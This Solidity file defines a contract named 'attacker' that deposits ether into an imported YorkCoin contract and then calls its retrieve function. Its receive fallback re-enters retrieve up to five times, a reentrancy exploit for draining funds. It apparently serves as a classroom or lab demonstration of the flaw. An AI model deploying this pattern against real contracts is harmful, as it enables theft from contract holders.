// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.19;

import "./YorkCoin.sol";

contract attacker {

    address victim;
    uint256 a;
    
    receive () external payable {
        while (a<5) {
            a++;
            YorkCoin(victim).retrieve();
        }
    }
  
    function setVictim(address _victim) public {
        victim = _victim;
    }
    
    function fundMe() payable public {}
    
    function buyVictimToken(uint256 amount) public {
        YorkCoin(victim).store{value:amount}();
    }
    
    function stealVictimToken() public {
        YorkCoin(victim).retrieve();
    }
}

